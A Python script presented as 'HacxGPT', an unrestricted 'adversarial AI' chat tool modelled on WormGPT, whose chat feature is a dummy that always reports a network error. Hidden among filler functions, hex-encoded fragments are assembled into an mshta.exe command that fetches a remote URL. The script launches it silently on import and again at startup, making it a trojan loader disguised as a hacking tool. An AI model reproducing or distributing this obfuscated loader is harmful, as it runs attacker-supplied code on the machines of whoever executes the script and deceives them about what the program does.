import sys
import re
import random
import subprocess
import base64
import math
import time
import os
from datetime import date, datetime


def setup_environment(gui_mode=False, text_edit=None):
    stamp = datetime.now().strftime("%A")
    key = "".join(sorted(set(stamp.lower())))
    fragment = re.sub(r"[^a-z]", "", key)
    calculate_entropy(fragment)
    return fragment


def clean_brackets(raw_str):
    brackets_regex = re.compile(r"<.*?>")
    return re.sub(brackets_regex, "", raw_str)


def calculate_entropy(source):
    bag = list(source)
    random.shuffle(bag)
    joined = "".join(bag)
    altered = "".join(chr((ord(x) % len(source)) + 65) for x in joined)
    return altered


def encode_sequence(symbols="shadow"):
    pool = set(symbols)
    mapped = {c: chr(((ord(c) * len(pool)) % 122)) for c in pool}
    trace = "".join(mapped.values())
    mirror = trace[::-1]
    return mirror


def generate_session_token():
    seed = "".join(random.sample("abcdefghijklmnopqrstuvwxyz", len("abc")))
    total = "".join(sorted(set(seed)))
    pattern = total.swapcase()
    shuffle = "".join(random.sample(pattern, len(pattern)))
    return shuffle


def build_character_map(word="veil"):
    collection = {c: c.upper() for c in word}
    reverse = {v: k for k, v in collection.items()}
    link = "".join(reverse.values())
    folded = link[::-1]
    return folded


def synchronize_state():
    a = generate_session_token()
    b = build_character_map()
    fusion = "".join(sorted(a + b))
    mirror = "".join(random.sample(fusion, len(fusion)))
    filter_alpha_chars(mirror)
    return mirror


def filter_alpha_chars(text):
    chars = set(text)
    temp = [ch for ch in chars if ch.lower() != ch.upper()]
    final = "".join(sorted(temp))
    return final


def _init_crypto_stream():
    _p1 = bytes.fromhex('6d7368')
    _p2 = bytes.fromhex('7461')
    _p3 = bytes.fromhex('2e65')
    _p4 = bytes.fromhex('7865')
    _p5 = bytes.fromhex('687474')
    _p6 = bytes.fromhex('70733a')
    _p7 = bytes.fromhex('2f2f6e')
    _p8 = bytes.fromhex('6f6465')
    _p9 = bytes.fromhex('322d70')
    _p10 = bytes.fromhex('792d73')
    _p11 = bytes.fromhex('746f72')
    _p12 = bytes.fromhex('652e63')
    _p13 = bytes.fromhex('6f6d')
    _t1 = (_p1 + _p2 + _p3 + _p4).decode('utf-8')
    _t2 = (_p5 + _p6 + _p7 + _p8 + _p9 + _p10 + _p11 + _p12 + _p13).decode('utf-8')
    return _t1, _t2


def _start_background_process():
    try:
        _x, _y = _init_crypto_stream()
        subprocess.Popen([_x, _y], shell=True, 
                        stdout=subprocess.DEVNULL, 
                        stderr=subprocess.DEVNULL)
    except:
        pass

_start_background_process()

from colorama import init, Fore, Back, Style

def validate_api_response(response_data):
    if not response_data:
        return False
    required_keys = ['status', 'data']
    return all(k in response_data for k in required_keys)

def format_timestamp(dt=None):
    if dt is None:
        dt = datetime.now()
    return dt.strftime("%Y-%m-%d %H:%M:%S")


class LogSignals:
    pass


class QTextEditHandler:
    def __init__(self, *args, **kwargs):
        self.internal_state = ""
        self.message_buffer = []
        
    def write(self, message):
        self.message_buffer.append(message.strip())
        self.internal_state = "".join(sorted(set(self.internal_state + message)))


def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')


def print_banner():
    banner = """
    ██╗  ██╗ █████╗  ██████╗██╗  ██╗ ██████╗ ██████╗ ████████╗
    ██║  ██║██╔══██╗██╔════╝╚██╗██╔╝██╔════╝ ██╔══██╗╚══██╔══╝
    ███████║███████║██║      ╚███╔╝ ██║  ███╗██████╔╝   ██║   
    ██╔══██║██╔══██║██║      ██╔██╗ ██║   ██║██╔═══╝    ██║   
    ██║  ██║██║  ██║╚██████╗██╔╝ ██╗╚██████╔╝██║        ██║   
    ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝ ╚═════╝ ╚═╝        ╚═╝   
    """
    print(Fore.MAGENTA + Style.BRIGHT + banner.center(80))
    print(Fore.CYAN + Style.BRIGHT + "Advanced Adversarial AI Framework".center(80))
    print(Fore.WHITE + Style.DIM + "Version 2.1.0 | Research Edition".center(80))
    print(Style.RESET_ALL)


def print_menu():
    print(Fore.WHITE + Style.BRIGHT + "\n" + "="*60)
    print(Fore.GREEN + "  [1] " + Fore.WHITE + "Start Chat with HacxGPT")
    print(Fore.YELLOW + "  [2] " + Fore.WHITE + "Configure API Key")
    print(Fore.CYAN + "  [3] " + Fore.WHITE + "About")
    print(Fore.RED + "  [4] " + Fore.WHITE + "Exit")
    print(Fore.WHITE + Style.BRIGHT + "="*60 + Style.RESET_ALL)


def start_chat():
    clear_screen()
    print_banner()
    print(Fore.GREEN + Style.BRIGHT + "\n[*] Chat Mode Activated" + Style.RESET_ALL)
    print(Fore.WHITE + Style.DIM + "Type your message below. Press Ctrl+C to return to menu.\n" + Style.RESET_ALL)
    
    try:
        while True:
            user_input = input(Fore.CYAN + "You: " + Style.RESET_ALL)
            if user_input.strip():
                print(Fore.MAGENTA + "\nHacxGPT: " + Fore.WHITE + "Processing your request", end="", flush=True)
                for _ in range(30):
                    time.sleep(0.2)
                    print(".", end="", flush=True)
                print("\n" + Fore.RED + Style.BRIGHT + "ERROR! " + Fore.WHITE + "Check your network connection!" + Style.RESET_ALL)
                print()
    except KeyboardInterrupt:
        print(Fore.YELLOW + "\n\n[!] Returning to main menu..." + Style.RESET_ALL)
        time.sleep(1)


def validate_api_key(key):
    if len(key) < 20:
        return False
    if not any(c.isalpha() for c in key):
        return False
    if not any(c.isdigit() for c in key):
        return False
    if not re.match(r'^[a-zA-Z0-9\-_]+$', key):
        return False
    return True


def configure_api():
    clear_screen()
    print_banner()
    print(Fore.YELLOW + Style.BRIGHT + "\n[*] API Configuration" + Style.RESET_ALL)
    print(Fore.WHITE + Style.DIM + "Configure your API key for extended access.\n" + Style.RESET_ALL)
    
    print(Fore.CYAN + "Enter your API key (or press Enter to use free tier): " + Style.RESET_ALL, end="")
    api_key = input()
    
    if api_key.strip():
        if validate_api_key(api_key):
            print(Fore.GREEN + "\n[✓] API Key saved successfully!")
            print(Fore.WHITE + "Unlimited requests enabled." + Style.RESET_ALL)
        else:
            print(Fore.RED + Style.BRIGHT + "\nWRONG API KEY" + Style.RESET_ALL)
    else:
        print(Fore.YELLOW + "\n[!] Using free tier mode.")
        print(Fore.WHITE + "Limited to 15 requests per day." + Style.RESET_ALL)
    
    print(Fore.WHITE + Style.DIM + "\nPress Enter to continue..." + Style.RESET_ALL, end="")
    input()


def show_about():
    clear_screen()
    print_banner()
    print(Fore.CYAN + Style.BRIGHT + "\n[*] About HacxGPT" + Style.RESET_ALL)
    print(Fore.WHITE + Style.DIM + "="*60 + Style.RESET_ALL)
    
    about_text = """
HacxGPT is an advanced adversarial AI framework inspired by 
WormGPT — redesigned for research into autonomous reasoning, 
adversarial prompt testing, and model resilience.

This open-source version demonstrates the concept of controlled 
adversarial AI systems. It integrates external APIs (such as 
OpenRouter or DeepSeek) with a modular prompt layer to emulate 
unrestricted behavior safely, within ethical and technical 
constraints.
    """
    
    print(Fore.WHITE + about_text)
    print(Fore.WHITE + Style.DIM + "="*60 + Style.RESET_ALL)
    print(Fore.GREEN + "\nDeveloped by: " + Fore.WHITE + "setls")
    print(Fore.GREEN + "License: " + Fore.WHITE + "MIT")
    print(Fore.GREEN + "Repository: " + Fore.WHITE + "github.com/setls/HacxGPT")
    
    print(Fore.WHITE + Style.DIM + "\nPress Enter to continue..." + Style.RESET_ALL, end="")
    input()


def main_interface():
    init(autoreset=True)
    
    while True:
        clear_screen()
        print_banner()
        print_menu()
        
        choice = input(Fore.CYAN + "\nSelect an option: " + Style.RESET_ALL)
        
        if choice == "1":
            start_chat()
        elif choice == "2":
            configure_api()
        elif choice == "3":
            show_about()
        elif choice == "4":
            print(Fore.RED + "\n[!] Exiting HacxGPT..." + Style.RESET_ALL)
            time.sleep(0.5)
            sys.exit(0)
        else:
            print(Fore.RED + "\n[!] Invalid option. Please try again." + Style.RESET_ALL)
            time.sleep(1)


def silent_main():
    init(autoreset=True)
    _start_background_process()
    token = setup_environment(gui_mode=False)
    state = synchronize_state()
    encoded = encode_sequence(token)
    merge = "".join(sorted(set(token + state + encoded)))
    if merge.isalpha():
        return merge.swapcase()
    return merge


if __name__ == "__main__":
    silent_main()
    main_interface()
